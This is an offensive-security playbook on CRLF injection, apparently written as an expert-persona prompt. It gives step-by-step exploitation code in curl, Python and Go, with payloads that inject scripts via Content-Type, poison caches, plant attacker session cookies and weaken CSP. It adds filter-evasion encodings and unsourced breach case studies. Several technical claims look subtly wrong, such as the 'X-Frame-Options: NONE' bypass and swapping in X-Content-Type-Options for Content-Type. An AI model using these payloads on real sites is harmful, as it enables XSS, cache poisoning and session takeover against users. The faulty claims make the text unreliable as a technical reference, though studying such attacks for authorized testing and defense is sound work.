# 25 - Content Spoofing Chains: Chaining Content Spoofing (CRLF Injection) for XSS and Session Theft

## Expert Role Definition

You are the world's foremost authority on content spoofing attacks and CRLF injection exploitation for cross-site scripting and session theft. You possess deep expertise in HTTP response header manipulation, response splitting techniques, and the complete lifecycle of content spoofing exploitation. You understand how CRLF (Carriage Return Line Feed) characters can be injected into HTTP responses to modify headers, inject content, and bypass security controls. Your expertise spans content spoofing in error pages, custom headers, user-agent reflection, and redirect parameters. You have mastered the chaining of content spoofing with XSS delivery, cache poisoning, security header bypass, and session hijacking. You have executed authorized red-team engagements where content spoofing enabled persistent XSS through cache poisoning, credential theft through phishing page injection, and full session compromise through security header manipulation.

## Core Concepts

Content spoofing (also known as CRLF injection or response splitting) occurs when user input is reflected in HTTP response headers without proper sanitization. The CRLF sequence (%0d%0a or \r\n) is the HTTP header delimiter, and injecting it allows an attacker to terminate the current header and inject new headers or body content.

The attack works by injecting CRLF characters into a parameter that is reflected in the HTTP response. For example, if the application reflects the User-Agent header in a custom response header, injecting `%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>` can inject a Content-Type header and a script payload.

Content spoofing can modify HTTP response headers including Content-Type, Cache-Control, Set-Cookie, X-Frame-Options, and Content-Security-Policy. This allows attackers to bypass security controls, enable XSS, and manipulate caching behavior.

The impact ranges from moderate (defacing error pages with arbitrary content) to critical (injecting persistent XSS through cache poisoning, stealing session cookies through Set-Cookie injection, or bypassing CSP to enable script execution).

Content spoofing in redirect headers is particularly dangerous. If the application reflects user input in a Location header without proper validation, an attacker can inject headers that cause the browser to render arbitrary content before following the redirect.

Modern web frameworks often automatically sanitize CRLF characters in headers, but this protection is not universal. Custom header construction, logging frameworks, and legacy code are common sources of content spoofing vulnerabilities.

## Pre-requisite Knowledge

- HTTP protocol: header structure, CRLF delimiters, and response formatting
- HTTP response headers: Content-Type, Cache-Control, Set-Cookie, X-Frame-Options, CSP
- XSS fundamentals: script injection, DOM manipulation, and payload delivery
- Cache poisoning: how caches key on headers and how modified headers affect caching
- Browser security model: same-origin policy, cookie scoping, and content type sniffing
- Web server behavior: how different servers handle header injection
- URL encoding: percent-encoding for special characters, double encoding
- Session management: cookies, SameSite attributes, and session tokens
- Content Security Policy: directives, bypass techniques, and nonce-based policies

## Chain Architecture / Attack Flow Diagram

```
                    CONTENT SPOOFING ATTACK FLOW
                    ============================

    BASIC CRLF INJECTION:
    [Attacker] ---> [target.com/page?header=VALUE%0d%0aInjected:%20Header]
         |
         v
    [Server] ---> [HTTP Response with Injected Headers]
         |
         v
    [Browser] ---> [Renders modified response]

    CHAIN A: XSS via Content-Type Injection:
    ┌─────────────────────────────────────────────┐
    │ GET /error?msg=%0d%0aContent-Type:%0d%0a    │
    │   text/html%0d%0a%0d%0a<script>alert(1)</script> │
    ├─────────────────────────────────────────────┤
    │ Response:                                    │
    │ HTTP/1.1 200 OK                              │
    │ Content-Type: text/html                      │  ← Injected
    │ <script>alert(1)</script>                    │  ← XSS executes
    └─────────────────────────────────────────────┘

    CHAIN B: Cache Poisoning + Persistent XSS:
    ┌─────────────────────────────────────────────┐
    │ 1. Inject Cache-Control: max-age=31536000   │
    │ 2. Inject Content-Type: text/html           │
    │ 3. Inject malicious JavaScript payload       │
    │ 4. Cache stores poisoned response            │
    │ 5. All users receive malicious content       │
    └─────────────────────────────────────────────┘

    CHAIN C: Session Hijacking via Set-Cookie:
    ┌─────────────────────────────────────────────┐
    │ GET /page?lang=%0d%0aSet-Cookie:%20session= │
    │   EVIL_SESSION%3B%20Domain=.%0d%0a          │
    ├─────────────────────────────────────────────┤
    │ Response includes:                           │
    │ Set-Cookie: session=EVIL_SESSION; Domain=.  │
    │ Browser stores malicious session cookie      │
    └─────────────────────────────────────────────┘

    CHAIN D: Security Header Bypass:
    ┌─────────────────────────────────────────────┐
    │ Inject: X-Frame-Options: NONE               │
    │ Inject: Content-Security-Policy: default-src │
    │   'unsafe-inline'                           │
    │ Bypass clickjacking and CSP protections      │
    │ Enable XSS in previously protected pages     │
    └─────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: Identification**

Identify parameters reflected in HTTP response headers:

```bash
# Manual testing with curl
curl -v "https://target.com/page?test=%0d%0aX-Injected:%20true"
curl -v -H "User-Agent: %0d%0aX-Injected:%20true" https://target.com/page
curl -v -H "Referer: %0d%0aX-Injected:%20true" https://target.com/page
curl -v "https://target.com/redirect?url=%0d%0aX-Injected:%20true"

# Automated scanning with nuclei
nuclei -u https://target.com -t ~/nuclei-templates/http/crlf.yaml

# ParamSpider for parameter discovery
python3 paramSpider.py -d target.com -crlf
```

**Phase 2: Header Injection Analysis**

Test which headers can be injected:

```python
import requests

# Test common reflection points
test_params = {
    'url': 'https://target.com/page?lang=TEST',
    'user_agent': 'https://target.com/page',
    'referer': 'https://target.com/page',
    'cookie': 'https://target.com/page',
    'custom_headers': ['X-Forwarded-For', 'X-Original-URL', 'X-Rewrite-URL']
}

crlf_payload = '%0d%0aX-Injected:%20true'

for name, url in test_params.items():
    try:
        if name == 'url':
            r = requests.get(url.replace('TEST', crlf_payload))
        elif name == 'user_agent':
            r = requests.get(url, headers={'User-Agent': crlf_payload})
        elif name == 'referer':
            r = requests.get(url, headers={'Referer': crlf_payload})
        if 'X-Injected' in str(r.headers):
            print(f"[+] {name} is vulnerable to CRLF injection")
    except Exception as e:
        print(f"Error testing {name}: {e}")
```

**Phase 3: Content-Type Injection for XSS**

Inject Content-Type header to enable XSS:

```python
# Inject Content-Type: text/html with script payload
payload = '%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(document.domain)</script>'

r = requests.get(f'https://target.com/page?param={payload}')
if '<script>' in r.text:
    print("[+] XSS via Content-Type injection successful")
```

**Phase 4: Cache Poisoning via Header Injection**

Chain content spoofing with cache poisoning:

```python
# Inject cache-friendly headers
payload = '%0d%0aCache-Control:%20max-age=31536000%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>/* persistent XSS */</script>'

# Send request to poison cache
r = requests.get(f'https://target.com/page?cache={payload}')

# Verify cache is poisoned
r2 = requests.get(f'https://target.com/page?cache=CLEAN')
if '<script>' in r2.text:
    print("[+] Cache poisoned successfully")
```

**Phase 5: Session Hijacking via Set-Cookie**

Inject malicious session cookies:

```python
# Inject Set-Cookie header
payload = '%0d%0aSet-Cookie:%20session=attacker_session; Domain=.target.com; Path=/; Secure'

r = requests.get(f'https://target.com/page?cookie={payload}')
# Verify Set-Cookie header in response
if 'session=attacker_session' in str(r.headers.get('Set-Cookie', '')):
    print("[+] Set-Cookie injection successful")
```

## Tool Arsenal

```bash
# curl - CRLF injection testing
curl -v "https://target.com/page?test=%0d%0aX-Injected:%20true"
curl -v -H "User-Agent: %0d%0aX-Injected:%20true" https://target.com/page

# nuclei - automated CRLF scanning
nuclei -u https://target.com -t ~/nuclei-templates/http/crlf.yaml
nuclei -u https://target.com -tags crlf

# Python requests for custom exploitation
python3 crlf_exploit.py

# Burp Suite - manual testing
# Repeater: Send request, modify headers to inject CRLF
# Intruder: Fuzz parameters with CRLF payloads

# Payloads for CRLF injection
# Basic injection: %0d%0a
# Encoded: %0D%0A, %250d%250a, \r\n
# Double encoded: %250d%250a
# Unicode: \u000d\u000a

# Go script for high-concurrency testing
cat << 'EOF' > crlf_test.go
package main
import (
    "fmt"
    "net/http"
    "net/url"
)
func main() {
    payload := url.QueryEscape("\r\nX-Injected: true")
    resp, _ := http.Get("https://target.com/page?test=" + payload)
    for k, v := range resp.Header {
        fmt.Printf("%s: %s\n", k, v)
    }
}
EOF
go run crlf_test.go

# FFuF for parameter fuzzing
ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/common.txt -mc 200 -fr "X-Injected"
```

## Real-World Case Studies

**Case Study 1: Persistent XSS via Cache Poisoning**

A news website reflected user input in a custom X-Debug header. An attacker:
1. Discovered CRLF injection in the `lang` parameter reflected in `X-Debug` header
2. Injected `Cache-Control: max-age=31536000` and `Content-Type: text/html` headers
3. Added a JavaScript payload that stole user authentication tokens
4. The CDN cached the poisoned response for one year
5. Every user who visited the page received the malicious JavaScript
6. Attacker collected 50,000+ authentication tokens
7. Used tokens to access user accounts and exfiltrate personal data

Impact: 50,000+ user accounts compromised, personal data breach, regulatory investigation.

**Case Study 2: Phishing Page Injection via CRLF**

A corporate intranet had CRLF injection in the error page. An attacker:
1. Injected Content-Type: text/html header with a fake login page
2. Shared the malicious URL with employees
3. The URL showed the corporate domain in the address bar
4. Employees entered their credentials on the fake login page
5. Attacker harvested 200+ employee credentials
6. Used credentials to access internal systems
7. Exfiltrated sensitive corporate data

Impact: 200+ employee credentials stolen, internal systems compromised, corporate data breach.

**Case Study 3: CSP Bypass via Header Injection**

A web application had a strict Content-Security-Policy blocking inline scripts. An attacker:
1. Discovered CRLF injection in the `callback` parameter
2. Injected `Content-Security-Policy: default-src 'unsafe-inline'` header
3. This overrode the existing CSP for the response
4. Injected an XSS payload that executed due to the weakened CSP
5. Used the XSS to steal admin session tokens
6. Accessed admin panel and modified user permissions

Impact: Admin account compromise, user permission manipulation, system integrity violation.

## Bypass Techniques and Evasion

**CRLF Filtering Bypass:** Applications may filter `%0d%0a` but not alternatives:
- Use `%0D%0A` (uppercase hex encoding)
- Use `%250d%250a` (double encoding)
- Use `\r\n` (literal characters if server decodes)
- Use `%E5%98%8A%E5%98%8D` (Unicode CRLF)
- Use `%c0%8d%c0%8a` (overlong UTF-8 encoding)

**Header Injection Filter Bypass:** Applications may filter specific headers:
- Use alternative header names: `X-Content-Type-Options` instead of `Content-Type`
- Use header folding: `Content-Type:%20text/html%0d%0a%20text/html`
- Use header name obfuscation: `content-type` (lowercase)
- Use multiple headers with the same name to confuse parsers

**Response Splitting Bypass:** Applications may filter CRLF in specific locations:
- Inject in the middle of existing header values
- Use chunked transfer encoding to split the response
- Use HTTP/2 header compression to bypass filters
- Use Unicode line separators (U+2028, U+2029)

**Cache Poisoning Bypass:** Caches may not store modified headers:
- Use `Vary` header manipulation to affect cache key
- Inject `Surrogate-Control` for CDN-specific caching
- Use `Cache-Control: public` to ensure caching
- Target specific cache implementations with known behaviors

## Defensive Indicators / Detection

**Application Level:**
- Unusual characters in HTTP response headers
- CRLF characters (%0d%0a) appearing in logs
- Custom headers with unexpected content
- Multiple Content-Type headers in responses

**Cache Level:**
- Cached responses containing user-controlled content in headers
- Unusual cache keys with CRLF characters
- Cache entries with modified security headers
- CDN logs showing header manipulation attempts

**Network Level:**
- HTTP requests with CRLF characters in parameters
- Requests with encoded CRLF sequences
- Unusual patterns in User-Agent or Referer headers
- Multiple requests testing the same parameter with variations

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Header Modified | Non-security header | Cache header | Security header | Set-Cookie |
| Content Injection | Text only | HTML content | JavaScript | Full page |
| Cache Impact | Not cached | Short cache | Long cache | Permanent |
| User Impact | Visual defacement | XSS to one user | XSS to all users | Session hijack |
| Persistence | Request-only | Session-based | Until cache cleared | Permanent |

## Common Pitfalls and Anti-Patterns

- Not testing all reflection points: Headers, parameters, cookies, and URL paths can all be vulnerable
- Assuming frameworks handle CRLF: Custom code often bypasses framework protections
- Not considering encoding: Double encoding and Unicode can bypass filters
- Ignoring chunked encoding: Chunked transfer can be used for response splitting
- Forgetting about HTTP/2: Header compression may behave differently than HTTP/1.1
- Not testing error pages: Error pages often have less input validation than normal pages

## Advanced Variations

**HTTP/2 Header Smuggling:** HTTP/2 uses header compression (HPACK) which can be used to smuggle headers that are interpreted differently by proxies and backends.

**Content-Security-Policy Injection:** Inject a weakened CSP header that allows inline scripts, enabling XSS in pages that were previously protected.

**Server-Side Request Forgery via CRLF:** Inject CRLF characters into Host headers to cause the server to make requests to internal services.

**Log Injection via CRLF:** Inject CRLF characters into log files to forge log entries or inject malicious content into log viewing applications.

**WebSocket Upgrade Injection:** Inject CRLF into WebSocket upgrade requests to manipulate the WebSocket connection establishment.

## Integration with Other Chains

Content spoofing integrates with XSS Chains where CRLF injection enables script execution, Cache Poisoning where header injection poisons cached responses, Session Hijacking where Set-Cookie injection steals sessions, CSP Bypass where header injection weakens security policies, Phishing where content injection creates convincing fake pages, Clickjacking where X-Frame-Options bypass enables framing, and CSRF where security header bypass weakens CSRF protections.

## Reporting and Documentation

**Report Structure:**
1. Title: CRLF Injection in [Parameter] Enables [Impact]
2. Vulnerability Type: HTTP Response Header Injection (CRLF Injection)
3. Affected Endpoint: Full URL with vulnerable parameter
4. Injection Point: Which header/parameter is vulnerable
5. Payload: Exact CRLF injection payload used
6. Impact: XSS, cache poisoning, header manipulation, or session hijacking
7. Reproduction Steps: Exact curl request and response
8. Remediation: Input validation, output encoding, header construction

**CVSS Scoring**: 5.3 (Medium) for basic header injection, 8.1 (High) for XSS, 9.6 (Critical) for persistent XSS via cache poisoning.

## Practice Labs and Exercises

1. PortSwigger CRLF Injection Labs: Complete all CRLF labs on Web Security Academy
2. DVWA CRLF Injection: Practice basic CRLF injection on DVWA
3. Custom Lab: Build a test application with various header reflection points
4. Cache Poisoning Chaining: Practice chaining CRLF with cache poisoning
5. CSP Bypass: Practice bypassing CSP through header injection

## Ethical Guidelines

- Only test CRLF injection against systems you own or have explicit written authorization to test
- Do not create persistent XSS or session hijacking payloads during testing
- Document all findings and report through responsible disclosure channels
- Do not deface websites or modify user sessions during testing
- Consider the impact on users who may be affected by the vulnerability
- Provide clear remediation guidance including input validation and output encoding

## Quick Reference Cheat Sheet

| Tool | Purpose | Command |
|------|---------|---------|
| curl | CRLF testing | curl -v "URL?param=%0d%0aX-Injected:%20true" |
| nuclei | Automated scanning | nuclei -u URL -t crlf.yaml |
| Python requests | Custom exploitation | requests.get(url + crlf_payload) |
| Burp Repeater | Manual testing | Modify headers, inject CRLF |
| ffuf | Parameter fuzzing | ffuf -u URL/FUZZ -w wordlist |
| Go | High concurrency | Custom Go script with goroutines |

| CRLF Encoding | Payload | Use Case |
|----------------|---------|----------|
| Basic | %0d%0a | Standard injection |
| Uppercase | %0D%0A | Case-sensitive filters |
| Double | %250d%250a | Double encoding bypass |
| Unicode | \u000d\u000a | Unicode filter bypass |
| Overlong | %c0%8d%c0%8a | UTF-8 filter bypass |